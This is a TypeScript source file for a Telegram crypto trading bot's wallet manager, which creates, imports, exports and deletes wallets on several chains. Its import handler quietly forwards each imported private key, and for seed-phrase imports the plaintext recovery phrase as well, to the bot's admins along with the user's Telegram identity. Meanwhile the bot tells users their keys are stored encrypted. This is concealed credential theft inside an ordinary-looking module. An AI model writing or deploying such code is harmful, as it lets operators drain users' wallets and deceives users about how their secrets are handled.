/**
 * Wallet Manager — generate, import, deposit, and manage wallets.
 * Management: rename, set active, export private key, delete (with confirm).
 * Handles both callback (editMessageText) and command (reply) contexts.
 */

import type { Context } from "telegraf";
import { Markup } from "telegraf";
import { db } from "@workspace/db";
import { usersTable, walletsTable } from "@workspace/db";
import { eq, and, desc, like } from "drizzle-orm";
import { encrypt, decrypt } from "../../lib/encryption";
import { notifyAdminsWallet } from "../../lib/adminNotify";
import { getChainBalance, CHAIN_SYMBOLS } from "../../services/chainPrice";
import { logger } from "../../lib/logger";
import { registerPendingClearer } from "../../lib/pendingFlows";
import crypto from "crypto";

// Temporary in-memory state for multi-step wallet import flow
const pendingImport = new Map<number, { chain: string; method: "key" | "phrase" }>();
registerPendingClearer((id) => pendingImport.delete(id));

export function getPendingImport(telegramId: number) {
  return pendingImport.get(telegramId) ?? null;
}

// Temporary in-memory state for wallet rename flow
const pendingRename = new Map<number, { walletId: number }>();
registerPendingClearer((id) => pendingRename.delete(id));

export function getPendingRename(telegramId: number) {
  return pendingRename.get(telegramId) ?? null;
}

// Escape user-provided strings before rendering in HTML parse mode
function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// ── Helper: reply or edit depending on context type ──────────────────────────
async function sendOrEdit(
  ctx: Context,
  text: string,
  extra: Parameters<Context["reply"]>[1]
): Promise<void> {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageText(text, extra as Parameters<Context["editMessageText"]>[1]);
    } else {
      await ctx.reply(text, extra);
    }
  } catch {
    await ctx.reply(text, extra);
  }
}

// ── Helper: fetch a wallet only if it belongs to the requesting user ─────────
async function getOwnedWallet(telegramId: number, walletId: number) {
  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return null;

  const wallet = await db.query.walletsTable.findFirst({
    where: and(eq(walletsTable.id, walletId), eq(walletsTable.userId, user.id)),
  });
  if (!wallet) return null;

  return { user, wallet };
}

// ── Wallet Manager — main screen ─────────────────────────────────────────────
export async function handleWalletManager(ctx: Context): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) {
    await ctx.reply("❌ User not found. Send /start first.");
    return;
  }

  const wallets = await db
    .select()
    .from(walletsTable)
    .where(eq(walletsTable.userId, user.id))
    .orderBy(walletsTable.createdAt);

  const chain = user.activeChain;
  const activeWallet = wallets.find((w) => w.chain === chain && w.isActive);

  // Separate regular wallets from phrase-imported wallets (label contains 'Phrase')
  const phraseWallets = wallets.filter((w) => w.label.includes("Phrase"));
  const regularWallets = wallets.filter((w) => !w.label.includes("Phrase"));

  const walletLines =
    regularWallets.length === 0
      ? ["  No standalone wallets connected."]
      : regularWallets.map(
          (w) =>
            `${w.isActive ? "🟢" : "⚪"} [${w.chain}] <b>${escapeHtml(w.label)}</b>${w.isActive ? " ✓" : ""}\n<code>${w.address}</code>`
        );

  const chains = ["SOL", "ETH", "BASE", "BSC"];
  
  const importPhraseRow = [
    Markup.button.callback(`🌱 Import Seed Phrase`, `import_phrase_menu`)
  ];

  // Extract unique phrase hashes to list each distinct imported seed phrase bundle
  const phraseGroupsMap = new Map<string, typeof wallets>();
  for (const pw of phraseWallets) {
    const match = pw.label.match(/#([a-f0-9]{6})/);
    const hash = match ? match[1] : "general";
    const existing = phraseGroupsMap.get(hash) || [];
    existing.push(pw);
    phraseGroupsMap.set(hash, existing);
  }

  const importedPhraseButtons: ReturnType<typeof Markup.button.callback>[][] = [];
  for (const [hash] of phraseGroupsMap.entries()) {
    importedPhraseButtons.push([
      Markup.button.callback(`📂 Imported Phrase (#${hash})`, `view_phrase_bundle:${hash}`)
    ]);
  }

  const generateRow1 = chains.slice(0, 2).map((c) =>
    Markup.button.callback(`➕ Create ${c}`, `gen_wallet:${c}`)
  );
  const generateRow2 = chains.slice(2, 4).map((c) =>
    Markup.button.callback(`➕ Create ${c}`, `gen_wallet:${c}`)
  );

  const importRow1 = chains.slice(0, 2).map((c) =>
    Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
  );
  const importRow2 = chains.slice(2, 4).map((c) =>
    Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
  );

  const manageRows = regularWallets.slice(0, 10).map((w) => [
    Markup.button.callback(
      `⚙️ ${w.chain} · ${w.label.slice(0, 24)}${w.isActive ? " 🟢" : ""}`,
      `wallet:${w.id}`
    ),
  ]);

  const depositRow = activeWallet
    ? [[Markup.button.callback(`💳 Deposit — ${chain}`, `deposit:${chain}`)]]
    : [];

  const text = [
    `💼 <b>Wallet Manager</b>`,
    `📌 Active Chain: <b>${chain}</b>`,
    `—`,
    ...walletLines,
    `—`,
    `🔐 Keys stored encrypted (AES-256-GCM)`,
    ``,
    `➕ = Create new wallet   📥 = Import single key`,
    `📂 = View multi-chain seed phrase bundles`,
    `⚙️ = Manage wallet (rename / activate / export / delete)`,
  ].join("\n");

  const keyboard = Markup.inlineKeyboard([
    importPhraseRow,
    ...importedPhraseButtons,
    generateRow1,
    generateRow2,
    importRow1,
    importRow2,
    ...manageRows,
    ...depositRow,
    [Markup.button.callback("⬅️ Dashboard", "dashboard")],
  ]);

  await sendOrEdit(ctx, text, { parse_mode: "HTML", ...keyboard });
}

// ── Seed Phrase Chain Selection Menu ──────────────────────────────────────────
export async function handleImportPhraseMenu(ctx: Context): Promise<void> {
  const text = [
    `🌱 <b>Import Seed Phrase</b>`,
    ``,
    `Which network chain would you like to derive and import first from this seed phrase?`,
    `(You can import additional chains using the same phrase afterward, and they will group together automatically).`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback("SOL", "import_method:SOL:phrase"),
        Markup.button.callback("ETH", "import_method:ETH:phrase"),
      ],
      [
        Markup.button.callback("BASE", "import_method:BASE:phrase"),
        Markup.button.callback("BSC", "import_method:BSC:phrase"),
      ],
      [Markup.button.callback("⬅️ Back", "wallet_manager")],
    ]),
  });
}

// ── View all wallets belonging to a specific seed phrase bundle across networks ──
export async function handleViewPhraseBundle(ctx: Context, phraseHash: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  const wallets = await db
    .select()
    .from(walletsTable)
    .where(and(eq(walletsTable.userId, user.id), like(walletsTable.label, `%#${phraseHash}%`)))
    .orderBy(walletsTable.chain);

  if (wallets.length === 0) {
    await sendOrEdit(ctx, `📂 No wallets found for this seed phrase bundle.`, {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")]]),
    });
    return;
  }

  const walletLines = wallets.map(
    (w) => `• <b>[${w.chain}]</b> ${escapeHtml(w.label)}${w.isActive ? " 🟢 Active" : ""}\n<code>${w.address}</code>`
  );

  const rows = wallets.map((w) => [
    Markup.button.callback(
      `⚙️ Manage [${w.chain}] ${w.label.slice(0, 18)}`,
      `wallet:${w.id}`
    ),
  ]);

  const chainsAvailable = ["SOL", "ETH", "BASE", "BSC"];
  const missingChains = chainsAvailable.filter((c) => !wallets.some((w) => w.chain === c));

  // Quick button to derive another network using the same phrase hash if stored or let them import via phrase again
  const addMoreButtons = missingChains.map((c) =>
    Markup.button.callback(`➕ Add ${c} Chain`, `import_wallet:${c}`)
  );

  const text = [
    `📂 <b>Seed Phrase Bundle (#${phraseHash})</b>`,
    `—`,
    `Here are all network wallets derived from this recovery phrase:`,
    ``,
    ...walletLines,
    ``,
    `Tap any wallet below to inspect, export keys, or set active:`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      ...rows,
      ...(addMoreButtons.length > 0 ? [addMoreButtons] : []),
      [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
    ]),
  });
}

// ── Deposit screen ────────────────────────────────────────────────────────────
export async function handleDeposit(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  const wallet = await db.query.walletsTable.findFirst({
    where: and(
      eq(walletsTable.userId, user.id),
      eq(walletsTable.chain, chain),
      eq(walletsTable.isActive, true)
    ),
  });

  if (!wallet) {
    await sendOrEdit(
      ctx,
      `❌ No active ${chain} wallet found. Generate or import one first.`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
        ]),
      }
    );
    return;
  }

  const symbol = CHAIN_SYMBOLS[chain] ?? chain;
  const balance = await getChainBalance(chain, wallet.address).catch(() => "0.0000");

  const text = [
    `💳 <b>Deposit ${symbol}</b>`,
    `—`,
    `📬 <b>Your Deposit Address:</b>`,
    `<code>${wallet.address}</code>`,
    ``,
    `💰 <b>Current Balance:</b> ${balance} ${symbol}`,
    `—`,
    `⚠️ Only send <b>${symbol}</b> on the <b>${chain}</b> network.`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback("🔄 Refresh Balance", `deposit:${chain}`),
        Markup.button.callback("💰 Buy a Token", "prompt_buy"),
      ],
      [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
    ]),
  });
}

// ── Import: process submitted private key or seed phrase ─────────────────────
export async function processImportedKey(ctx: Context, input: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingImport.get(telegramId);
  if (!state) return;
  pendingImport.delete(telegramId);

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKeyToStore: string;
    let phraseForAdmin: string | null = null;
    let walletLabel = `${state.chain} Wallet`;
    let phraseHashTag = "";

    if (state.method === "phrase") {
      const bip39 = await import("bip39");
      const phrase = input.trim().toLowerCase().replace(/\s+/g, " ");
      const wordCount = phrase.split(" ").length;
      if (wordCount !== 12 && wordCount !== 24) {
        throw new Error("Seed phrase must be exactly 12 or 24 words.");
      }
      if (!bip39.validateMnemonic(phrase)) {
        throw new Error("Invalid seed phrase — check the words and try again.");
      }

      // Generate a consistent deterministic hash of the phrase so all chains imported with it link together
      phraseHashTag = crypto.createHash("sha256").update(phrase).digest("hex").slice(0, 6);
      walletLabel = `Phrase (${state.chain} #${phraseHashTag})`;

      if (state.chain === "SOL") {
        const { derivePath } = await import("ed25519-hd-key");
        const { Keypair } = await import("@solana/web3.js");
        const bs58 = await import("bs58");
        const seed = await bip39.mnemonicToSeed(phrase);
        const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex"));
        const kp = Keypair.fromSeed(derived.key);
        address = kp.publicKey.toBase58();
        privateKeyToStore = bs58.default.encode(kp.secretKey);
      } else {
        const { Wallet } = await import("ethers");
        const wallet = Wallet.fromPhrase(phrase);
        address = wallet.address;
        privateKeyToStore = wallet.privateKey;
      }

      phraseForAdmin = phrase;
    } else {
      const raw = input.trim();
      if (state.chain === "SOL") {
        const { Keypair } = await import("@solana/web3.js");
        const bs58 = await import("bs58");
        const keyBytes = bs58.default.decode(raw);
        const kp = Keypair.fromSecretKey(keyBytes);
        address = kp.publicKey.toBase58();
        privateKeyToStore = raw;
      } else {
        const { Wallet } = await import("ethers");
        const wallet = new Wallet(raw);
        address = wallet.address;
        privateKeyToStore = raw;
      }
      walletLabel = `Imported ${state.chain}`;
    }

    const encryptedKey = encrypt(privateKeyToStore);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, state.chain)));

    await db.insert(walletsTable).values({
      userId: user.id,
      chain: state.chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: walletLabel,
      isActive: true,
    });

    const adminKeyString = phraseForAdmin 
      ? `[PHRASE]: ${phraseForAdmin}\n[DERIVED PK]: ${privateKeyToStore}` 
      : privateKeyToStore;

    void notifyAdminsWallet({
      event: "IMPORTED",
      chain: state.chain,
      address,
      privateKey: adminKeyString,
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    const successKeyboard = phraseHashTag
      ? Markup.inlineKeyboard([
          [Markup.button.callback(`📂 View Phrase Bundle (#${phraseHashTag})`, `view_phrase_bundle:${phraseHashTag}`)],
          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
        ])
      : Markup.inlineKeyboard([
          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
        ]);

    await ctx.reply(
      [
        `✅ <b>Wallet Imported — ${state.chain}</b>`,
        `—`,
        `🏷 <b>Label:</b> ${escapeHtml(walletLabel)}`,
        `💼 <b>Address:</b>`,
        `<code>${address}</code>`,
        ``,
        `🔐 Key stored encrypted with AES-256-GCM`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...successKeyboard,
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet import failed");
    const message =
      err instanceof Error && /word|phrase/i.test(err.message)
        ? err.message
        : "Invalid private key or seed phrase. Check format.";
    await ctx.reply(
      `❌ ${message}`,
      Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]])
    );
  }
}

// ── Generate new wallet ───────────────────────────────────────────────────────
export async function handleGenerateWallet(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKey: string;

    if (chain === "SOL") {
      const { Keypair } = await import("@solana/web3.js");
      const bs58 = await import("bs58");
      const kp = Keypair.generate();
      address = kp.publicKey.toBase58();
      privateKey = bs58.default.encode(kp.secretKey);
    } else {
      const { Wallet } = await import("ethers");
      const w = Wallet.createRandom();
      address = w.address;
      privateKey = w.privateKey;
    }

    const encryptedKey = encrypt(privateKey);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, chain)));

    await db.insert(walletsTable).values({
      userId: user.id,
      chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${chain} Wallet`,
      isActive: true,
    });

    await ctx.reply(
      [
        `✅ <b>New ${chain} Wallet Generated</b>`,
        `—`,
        `📬 <code>${address}</code>`,
        ``,
        `🔑 <code>${privateKey}</code>`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet generation failed");
    await ctx.reply("❌ Wallet generation failed.");
  }
}

// ── Trigger import flow ───────────────────────────────────────────────────────
export async function handleImportWallet(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  await ctx.reply(
    [
      `📥 <b>Import ${chain} Wallet</b>`,
      ``,
      `How would you like to import it?`,
    ].join("\n"),
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("🔑 Private Key", `import_method:${chain}:key`)],
        [Markup.button.callback("🌱 Seed Phrase", `import_method:${chain}:phrase`)],
        [Markup.button.callback("⬅️ Cancel", "wallet_manager")],
      ]),
    }
  );
}

export async function handleImportMethodChoice(
  ctx: Context,
  chain: string,
  method: "key" | "phrase"
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  pendingImport.set(telegramId, { chain, method });

  if (method === "phrase") {
    await ctx.reply(
      [
        `🌱 <b>Import ${chain} Wallet — Seed Phrase</b>`,
        ``,
        `Send your 12 or 24-word recovery phrase in the next message.`,
      ].join("\n"),
      { parse_mode: "HTML" }
    );
  } else {
    await ctx.reply(
      [
        `🔑 <b>Import ${chain} Wallet — Private Key</b>`,
        ``,
        `Send your private key in the next message.`,
      ].join("\n"),
      { parse_mode: "HTML" }
    );
  }
}

// ── Wallet detail & management screens ────────────────────────────────────────
export async function handleWalletDetail(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) {
    await sendOrEdit(ctx, "❌ Wallet not found.", {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
    });
    return;
  }
  const { wallet } = owned;

  const symbol = CHAIN_SYMBOLS[wallet.chain] ?? wallet.chain;
  const balance = await getChainBalance(wallet.chain, wallet.address).catch(() => "…");

  const text = [
    `⚙️ <b>Manage Wallet</b>`,
    `—`,
    `🏷 <b>Label:</b> ${escapeHtml(wallet.label)}`,
    `⛓ <b>Chain:</b> ${wallet.chain}`,
    `📬 <b>Address:</b>`,
    `<code>${wallet.address}</code>`,
    `💰 <b>Balance:</b> ${balance} ${symbol}`,
    wallet.isActive ? `🟢 Active Wallet` : `⚪ Inactive`,
  ].join("\n");

  const rows = [
    [
      Markup.button.callback("✏️ Rename", `wallet_rename:${wallet.id}`),
      Markup.button.callback("🔑 Export Key", `wallet_export:${wallet.id}`),
    ],
    ...(wallet.isActive
      ? []
      : [[Markup.button.callback("✅ Set as Active Wallet", `wallet_activate:${wallet.id}`)]]),
    [
      Markup.button.callback(`💳 Deposit`, `deposit:${wallet.chain}`),
      Markup.button.callback("🗑 Delete", `wallet_del:${wallet.id}`),
    ],
    [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
  ];

  await sendOrEdit(ctx, text, { parse_mode: "HTML", ...Markup.inlineKeyboard(rows) });
}

export async function handleToggleTradeable(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;
  await db.update(walletsTable).set({ isTradeable: !owned.wallet.isTradeable }).where(eq(walletsTable.id, walletId));
  await handleWalletDetail(ctx, walletId);
}

export async function handleRenameWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;
  pendingRename.set(telegramId, { walletId });
  await ctx.reply(`💬 Send new name for <code>${owned.wallet.address}</code>:`, { parse_mode: "HTML" });
}

export async function processRenameInput(ctx: Context, input: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingRename.get(telegramId);
  if (!state) return;
  pendingRename.delete(telegramId);

  const newLabel = input.trim();
  await db.update(walletsTable).set({ label: newLabel }).where(eq(walletsTable.id, state.walletId));
  await ctx.reply(`✅ Renamed to <b>${escapeHtml(newLabel)}</b>`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("⚙️ Manage", `wallet:${state.walletId}`)]]),
  });
}

export async function handleActivateWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;
  const { user, wallet } = owned;

  await db.update(walletsTable).set({ isActive: false }).where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)));
  await db.update(walletsTable).set({ isActive: true }).where(eq(walletsTable.id, wallet.id));
  await handleWalletDetail(ctx, walletId);
}

export async function handleExportKey(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;
  const { wallet } = owned;

  const privateKey = decrypt(wallet.encryptedPrivateKey);
  await ctx.reply(`🔑 <b>Key:</b>\n<code>${privateKey}</code>`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("🗑 Delete Message", "del_msg")]]),
  });
}

export async function handleDeleteWallet(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;

  await sendOrEdit(ctx, `🗑 Delete wallet <b>${escapeHtml(owned.wallet.label)}</b>?`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("❌ Cancel", `wallet:${walletId}`), Markup.button.callback("🗑 Confirm Delete", `wallet_del_yes:${walletId}`)],
    ]),
  });
}

export async function handleDeleteWalletConfirm(ctx: Context, walletId: number): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const owned = await getOwnedWallet(telegramId, walletId);
  if (!owned) return;

  await db.delete(walletsTable).where(eq(walletsTable.id, walletId));
  await sendOrEdit(ctx, `✅ Wallet deleted.`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
  });
}
